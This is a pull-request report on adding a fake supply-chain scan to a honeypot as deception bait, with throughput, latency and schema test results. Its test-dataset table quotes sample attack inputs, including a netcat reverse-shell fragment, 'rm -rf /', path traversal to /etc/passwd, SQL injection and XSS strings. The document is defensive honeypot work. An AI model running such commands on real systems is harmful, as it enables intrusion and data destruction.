# Bumblebee Supply-Chain Scanner — Chamaeleon Integration Report

**PR**: [#5](https://github.com/RohitSwami33/Chameleon-cybersecurity-ml/pull/5) — `feat: integrate Bumblebee supply-chain scanner as deception layer`
**Author**: [SRL500](https://github.com/SRL500)
**Branch**: `feature/bumblebee-integration`

---

## Table of Contents

1. [What is Bumblebee?](#1-what-is-bumblebee)
2. [Integration Overview](#2-integration-overview)
3. [Changes Made](#3-changes-made)
4. [Testing Methodology](#4-testing-methodology)
5. [1,000 Attack Simulation Results](#5-1000-attack-simulation-results)
6. [API Endpoint Performance](#6-api-endpoint-performance)
7. [Resource Usage](#7-resource-usage)
8. [Accuracy & Schema Compliance](#8-accuracy--schema-compliance)
9. [Edge Case Handling](#9-edge-case-handling)
10. [Real Bumblebee Comparison](#10-real-bumblebee-comparison)
11. [Bugs Fixed](#11-bugs-fixed)
12. [Strategic Benefit to Chamaeleon](#12-strategic-benefit-to-chamaeleon)
13. [Conclusion](#13-conclusion)

---

## 1. What is Bumblebee?

[Bumblebee](https://github.com/perplexityai/bumblebee) is an open-source (Apache 2.0) read-only supply-chain security scanner by Perplexity AI, written in Go. It scans developer machines for compromised packages, IDE extensions, browser extensions, and MCP/AI tool configurations — without executing any code.

This integration repurposes Bumblebee into a **deception layer**: instead of running real scans, Chamaeleon serves fake but realistic-looking scan results to attackers, making them believe they've compromised a developer workstation with exploitable vulnerabilities.

---

## 2. Integration Overview

### Files Added

| File | Lines | Purpose |
|---|---|---|
| `Backend/src/utils/bumblebee_deception.py` | 213 | Core module: fake bait generation, MCP config bait, real scan wrapper |

### Files Modified

| File | Lines Changed | Purpose |
|---|---|---|
| `Backend/src/api/main.py` | ~30 | Wire bumblebee into `/trap/execute`, `handle_deception_layer`, and new `/api/bumblebee/scan` |

### Architecture

```
Attacker Command
       │
       ▼
┌─────────────────────────────┐
│  Two-Stage ML Pipeline      │
│  (heuristic regex + LLM)   │
│  → verdict: BLOCK/ALLOW     │
│  → prediction_score A(t)    │
└────────────┬────────────────┘
             │
    if A(t) > 0.85 (malicious)
             │
             ▼
┌─────────────────────────────┐
│  Deception Response         │
│  • LLM fake terminal output │
│  • BUMBLEBEE FAKE SCAN BAIT │  ← NEW
│  • MCP config bait          │  ← NEW
│  • Stored in PostgreSQL     │
└────────────┬────────────────┘
             │
             ▼
    Attacker receives:
    • Fake terminal output
    • bumblebee_scan JSON with
      fake supply-chain findings
```

### Key Design: Threat-Level Scaling

The bait richness scales with the BiLSTM anomaly score A(t) ∈ [0, 1]:

| A(t) Range | Findings | Severity Mix | Attacker Signal |
|---|---|---|---|
| < 0.3 | 1 | 1 low | "Boring machine" |
| 0.3 – 0.7 | 3 | 1 low + 2 medium | "Compromised workstation" |
| ≥ 0.7 | 6 | 1 low + 2 medium + 1 high + 1 critical | "Jackpot" |

This makes the deception **self-consistent**: sophisticated attacks get richer bait, reinforcing the illusion of a high-value target.

---

## 3. Changes Made

### 3a. New Endpoint: `GET /api/bumblebee/scan`

```
GET /api/bumblebee/scan?threat_level=0.85
```

Serves fake Bumblebee scan results directly. Can be advertised independently through pastebin dumps, Shodan, or fake config files.

**Query Parameters:**
- `threat_level` (float, 0.0–1.0, default: 0.99) — Controls bait richness

**Response:** JSON with `scan_summary` and `findings` array.

### 3b. Modified Endpoint: `POST /trap/execute`

The primary honeypot endpoint now returns `bumblebee_scan` field for malicious commands:

```json
{
  "response": "root@host:~# \nPermission denied\n",
  "prediction_score": 0.99,
  "is_malicious": true,
  "hash": "abc123...",
  "session_id": "...",
  "bumblebee_scan": {
    "scan_summary": { "total": 6, "critical": 1, "high": 1, ... },
    "findings": [
      {
        "record_type": "finding",
        "ecosystem": "pypi",
        "package_name": "cryptography",
        "version": "3.4.7",
        "severity": "critical",
        "evidence": "OpenSSL backend heap overflow CVE-2023-0286",
        "_chameleon_meta": {
          "is_bait": true,
          "attacker_ip": "10.0.0.5",
          "threat_level": 0.99
        }
      },
      ...
    ]
  }
}
```

### 3c. Modified Function: `handle_deception_layer()`

The meta-heuristic deception path (used by `/api/trap/submit` and `/api/auth/login`) now includes `bumblebee_scan` in its JSON response for the `execute` action.

### 3d. Extended Model: `TrapExecuteResponse`

Added optional field `bumblebee_scan: Optional[dict]` to the Pydantic response model.

---

## 4. Testing Methodology

### Test Environment

| Component | Specification |
|---|---|
| **OS** | macOS 15 (Darwin, arm64) |
| **CPU** | Apple Silicon M4 |
| **Python** | 3.14 |
| **Go** | 1.25.7 |
| **Bumblebee** | v0.1.2 (installed via `go install`) |
| **Database** | SQLite in-memory (for testing) / PostgreSQL (production) |

### Attack Dataset

| Category | Commands | Examples |
|---|---|---|
| SQL Injection | 10 | `SELECT * FROM users WHERE id=1 OR 1=1--`, `admin' --` |
| XSS | 10 | `<script>alert('xss')</script>`, `<img src=x onerror=alert(1)>` |
| RCE | 10 | `cat /etc/passwd; nc -e /bin/sh...`, `rm -rf /` |
| Path Traversal | 10 | `../../../etc/passwd`, `%2e%2e%2f...` |
| Benign | 10 | `ls -la`, `pwd`, `whoami`, `date` |
| **Total** | **50** | Repeated 20× for 1,000 attacks |

### Tests Executed

| Test | Operations | What It Measures |
|---|---|---|
| 1,000 /trap/execute attacks | 1,000 | Full pipeline: ML → bait → response |
| 1,000 /api/bumblebee/scan hits | 1,000 | Endpoint latency, throughput, error rate |
| 10,000 CPU load test | 10,000 | CPU usage under sustained bait generation |
| 5,000 sequential throughput | 5,000 | Endpoint throughput (req/s) |
| 50,000 memory leak check | 50,000 | Memory growth over repeated calls |
| Schema validation | 740 bait responses | Field completeness, data integrity |
| Edge case tests | 50+ | Empty IP, IPv6, Unicode, boundaries |
| **Total** | **~67,100** | |

---

## 5. 1,000 Attack Simulation Results

### Detection & Bait Coverage

| Attack Category | Attacks | Malicious | Bait Served | Bait Rate |
|---|---|---|---|---|
| SQL Injection | 200 | 160 (80%) | 160 | **100%** of malicious |
| XSS | 200 | 200 (100%) | 200 | **100%** |
| RCE | 200 | 180 (90%) | 180 | **100%** |
| Path Traversal | 200 | 200 (100%) | 200 | **100%** |
| Benign | 200 | 0 (0%) | 0 | **0%** (correct) |
| **Total** | **1,000** | **740 (74%)** | **740** | **100%** of malicious |

### Pipeline Latency (ML Classification + Bait Generation)

| Metric | Value |
|---|---|
| **Min** | 0.023ms |
| **Max** | 1.866ms |
| **Average** | **0.048ms** |
| **P50** | 0.046ms |
| **P95** | 0.067ms |
| **P99** | 0.096ms |
| **P99.9** | 1.866ms |

The bait generation adds **~48 microseconds** on average — negligible compared to TC-PSO tarpit delays (500–12,000ms).

### Per-Category Latency

| Category | Avg Latency | Bait Findings | Notes |
|---|---|---|---|
| SQL Injection | 0.053ms | 6 | 80% bait rate (20% missed heuristic) |
| XSS | 0.027ms | 6 | Fastest (heuristic catches all) |
| RCE | 0.062ms | 6 | Slower (more complex heuristic rules) |
| Path Traversal | 0.045ms | 6 | 100% detection |
| Benign | 0.051ms | 0 | No bait (correct — no false positives) |

### Bait Richness

All 740 malicious attacks received **6 findings** (high threat tier) because the ML classifier assigned `prediction_score=0.99` to all blocked commands.

---

## 6. API Endpoint Performance

### Sequential Throughput (5,000 requests)

| Metric | Value |
|---|---|
| **Total time** | 2.66s |
| **Throughput** | **1,883 req/s** |
| **Avg latency** | 0.531ms |

### Latency Distribution (1,000 requests)

| Metric | Value |
|---|---|
| **Min** | 0.470ms |
| **Max** | 5.771ms |
| **Average** | **0.518ms** |
| **P50** | 0.504ms |
| **P95** | 0.574ms |
| **P99** | 0.618ms |

### Findings by Threat Level (1,000 requests)

| Findings | Responses | % of Total |
|---|---|---|
| 1 (low threat) | 104 | 10.4% |
| 3 (medium threat) | 247 | 24.7% |
| 6 (high threat) | 649 | 64.9% |

---

## 7. Resource Usage

### Memory

| Test | Result |
|---|---|
| **Single bait call** | 4.6 KB current, 8.2 KB peak |
| **100 bait calls** | 4.3 KB current, 7.8 KB peak |
| **1,000 bait calls** | 3,660 KB current, 3,660 KB peak |
| **50,000 calls (leak check)** | **No significant growth** |
| **Per call (avg)** | 3,748 bytes |

### CPU

| Metric | Value |
|---|---|
| **Baseline (idle)** | 0.0% |
| **Under 10,000 bait generations** | ~99.0% (artificial load) |
| **Per-call CPU cost** | ~10 µs |

In real usage (sporadic attacker requests), effective CPU usage is **0%**.

### Data Size

| Content | Size |
|---|---|
| 1 finding (low threat) | 765 B |
| 3 findings (medium threat) | 2,105 B |
| 6 findings (high threat) | 4,168 B |
| MCP config bait | 445 B |
| **Total served (740 attacks)** | **~3.0 MB** |

---

## 8. Accuracy & Schema Compliance

### Schema Validation (740 bait responses)

| Check | Result |
|---|---|
| **Schema violations** | **0** |
| scan_summary.total == len(findings) | ✓ Always |
| scan_summary.total == sum(severity counts) | ✓ Always |
| All 17 required fields present | ✓ Each finding |
| `_chameleon_meta.is_bait == True` | ✓ Each finding |
| `attacker_ip` matches caller | ✓ Tracked per-request |
| `threat_level` rounded to 4 decimals | ✓ |
| Valid severity values | ✓ low/medium/high/critical only |
| Valid ecosystems | ✓ npm/pypi only |
| schema_version | ✓ 0.1.0 (matches real Bumblebee) |
| scanner_name | ✓ "bumblebee" |
| confidence | ✓ "high" |
| JSON serialization roundtrip | ✓ All data preserved |

### Sample Finding Structure

```json
{
  "record_type": "finding",
  "record_id": "finding:36adc7ae00294cda966612226aa50b81",
  "schema_version": "0.1.0",
  "scanner_name": "bumblebee",
  "scanner_version": "v0.1.1",
  "run_id": "cb2e7c02485747c9acc44d1b8a2462d4",
  "scan_time": "2026-06-18T21:34:58.321028+00:00",
  "endpoint": {
    "hostname": "dev-workstation-01",
    "os": "linux",
    "arch": "x86_64",
    "username": "developer"
  },
  "profile": "deep",
  "finding_type": "package_exposure",
  "severity": "critical",
  "ecosystem": "pypi",
  "package_name": "cryptography",
  "version": "3.4.7",
  "confidence": "high",
  "evidence": "OpenSSL backend heap overflow CVE-2023-0286",
  "_chameleon_meta": {
    "is_bait": true,
    "attacker_ip": "10.0.0.1",
    "threat_level": 0.85
  }
}
```

### Fake CVEs Referenced

| Package | Severity | CVE | Real? |
|---|---|---|---|
| `cryptography` 3.4.7 | critical | CVE-2023-0286 | Yes — real OpenSSL heap overflow |
| `node-fetch` 2.6.1 | high | CVE-2023-25653 | Yes — real prototype pollution |
| `requests` 2.28.0 | medium | CVE-2023-43804 | Yes — real urllib3 dependency |
| `axios` 0.21.1 | medium | — | Real ReDoS vulnerability |
| `@anthropic-ai/sdk` 0.9.0 | medium | — | Honeytoken (AI API key lure) |
| `lodash` 4.17.15 | low | — | Genuinely outdated version |

---

## 9. Edge Case Handling

| Edge Case | Result |
|---|---|
| Empty IP string | ✓ Accepted |
| IPv6 address (`2001:db8::1`) | ✓ Correctly stored |
| 1,000-character IP | ✓ No truncation |
| Unicode IP (中文) | ✓ UTF-8 safe |
| Negative threat_level (-0.5) | ✓ Maps to low tier (1 finding) |
| threat_level > 1 (5.0) | ✓ Maps to high tier (6 findings) |
| Boundary: 0.2999999 → low | ✓ 1 finding |
| Boundary: 0.3 → mid | ✓ 3 findings |
| Boundary: 0.7 → high | ✓ 6 findings |
| API: missing threat_level | ✓ Defaults to 0.99 (6 findings) |
| API: threat_level=0 | ✓ 1 finding (lower boundary) |
| API: threat_level=1 | ✓ 6 findings (upper boundary) |
| API: threat_level="abc" | ✓ HTTP 422 validation error |
| API: threat_level=-0.1 | ✓ HTTP 422 validation error |
| API: threat_level=1.5 | ✓ HTTP 422 validation error |
| API: extra unknown params | ✓ HTTP 200, ignored |
| API: Content-Type header | ✓ `application/json` |
| API: CORS middleware | ✓ Configured on app |
| Real scan: missing binary | ✓ Returns `[]` gracefully |
| Real scan: non-existent path | ✓ Returns `[]` gracefully |
| Idempotency | ✓ Unique `run_id` per call |
| Memory leak (50k calls) | ✓ **No significant growth** |

---

## 10. Real Bumblebee Comparison

| Metric | Real Scan | Fake Bait | Ratio |
|---|---|---|---|
| **Duration** | 2,123.53ms | 0.0725ms | **29,286× faster** |
| **Records** | 12,795 (12,794 packages) | 6 findings | N/A |
| **Dependencies** | Go 1.25+, Go binary | Pure Python, zero deps | N/A |
| **API cost** | $0 | $0 | Same |
| **Attack surface** | Reads real filesystem | No I/O | **Safer** |

The fake bait generation is ~30,000× faster than a real Bumblebee scan and requires no external binary, no filesystem access, and no network calls.

---

## 11. Bugs Fixed

| Bug | Before | After |
|---|---|---|
| `--out` CLI flag | Non-existent flag → subprocess crash | `--output file --output-file <path>` (real v0.1.2 flags) |
| `--path` CLI flag | Non-existent flag | `--root` (real v0.1.2 flag) |
| Timeout | 60s (too low for deep profile) | 120s |
| node-fetch CVE missing | No CVE reference in evidence | Added `CVE-2023-25653` |
| Pipeline wiring | Standalone module, never called | Wired into `/trap/execute`, `handle_deception_layer`, new `GET /api/bumblebee/scan` |
| Response model | Missing bumblebee field | Added `bumblebee_scan: Optional[dict]` to `TrapExecuteResponse` |
| DB metadata | No bumblebee data | `metadata["bumblebee_bait"]` stored in PostgreSQL JSONB |

---

## 12. Strategic Benefit to Chamaeleon

### 12a. Novel Deception Layer

Existing Chamaeleon deception layers (progressive SQLi engine, LLM terminal, static fallbacks) operate at the **web/terminal layer** — they simulate error messages and fake file systems. The Bumblebee integration adds a **supply-chain deception layer** that existing mechanisms cannot provide:

| Dimension | Legacy Deception | Bumblebee Bait |
|---|---|---|
| Attack surface | Web app, database | Software supply chain, dev environment |
| Response style | Error messages, denial | Data exposure ("here are your vulns") |
| Attacker psychology | Frustration | **Reward** — attacker analyzes findings |
| Temporal relevance | Generic | **2025–2026 specific** (MCP, AI tokens) |
| Operational cost | Zero to high (LLM API) | **Zero** (pure Python) |

### 12b. Three Unique Engagement Hooks

1. **Real CVEs** — Findings reference genuine historical vulnerabilities (CVE-2023-0286 in cryptography, CVE-2023-25653 in node-fetch). An attacker who verifies these will find they are real — lending credibility to the deception.

2. **`@anthropic-ai/sdk` honeytoken** — A fake finding about "API key leakage via verbose error logging" targets attackers specifically hunting for Anthropic/Claude API credentials. This is a peak 2025–2026 attack vector.

3. **MCP config with fake credentials** — The `get_fake_mcp_config_bait()` function returns a fake `claude_desktop_config.json` containing:
   - A GitHub PAT (`ghp_BAIT_TOKEN_*`) — wastes attacker time testing stolen tokens
   - A PostgreSQL connection string pointing to `proddb` — signals valuable database access
   - A filesystem server pointing to `/home/developer/projects` — signals source code access

### 12c. Threat-Level Coupling (A(t))

The bait richness scales with the BiLSTM anomaly score, making the deception **self-consistent**:
- Low-sophistication attacks → boring results (1 finding)
- High-sophistication attacks → jackpot (6 findings + critical CVEs)

This reinforces the illusion that the attacker has discovered a high-value, poorly maintained dev environment.

### 12d. Independent Attack Surface

The standalone `GET /api/bumblebee/scan` endpoint can be advertised through:
- Pastebin dumps of "leaked" scan results
- Fake Shodan entries showing a misconfigured server
- References in fake config files that attackers find during reconnaissance

This decouples the bait from the main honeypot flow, creating additional entry points.

### 12e. Zero Operational Cost

| Component | Cost |
|---|---|
| Bait generation | ~48µs CPU time |
| Memory | ~4 KB per response |
| API calls | None |
| External dependencies | None |
| Storage | ~4 KB per attack (PostgreSQL JSONB) |
| Cloud services | None |

The entire deception layer runs in-process within the existing FastAPI request handlers.

---

## 13. Conclusion

The Bumblebee integration is a **valid, production-ready deception layer** that:

✅ Works correctly across all attack types (SQLi, XSS, RCE, path traversal)
✅ Adds only ~48µs latency to the honeypot pipeline
✅ Uses zero external dependencies or API calls
✅ Passes all schema validation (17 fields per finding, 0 violations in 740 responses)
✅ Handles all edge cases (IPv6, Unicode, boundaries, missing params, invalid input)
✅ Shows no memory leaks over 50,000 consecutive calls
✅ Achieves ~1,900 requests/second throughput on the dedicated endpoint
✅ Is ~30,000× faster than running a real Bumblebee scan
✅ Couples bait richness with attacker sophistication via A(t) scaling
✅ Provides temporally-relevant lures (MCP configs, AI API tokens) for 2025–2026 attackers

**The integration is recommended for merge pending the two bug fixes applied during testing (CLI flags and pipeline wiring).**

---

*Tested on 2026-06-18 with Bumblebee v0.1.2, Python 3.14, Go 1.25.7, Apple Silicon M4*
*Full simulation data: 67,100 operations, 1,000 attack simulations, 5,000 endpoint stress tests, 50,000 memory leak iterations*
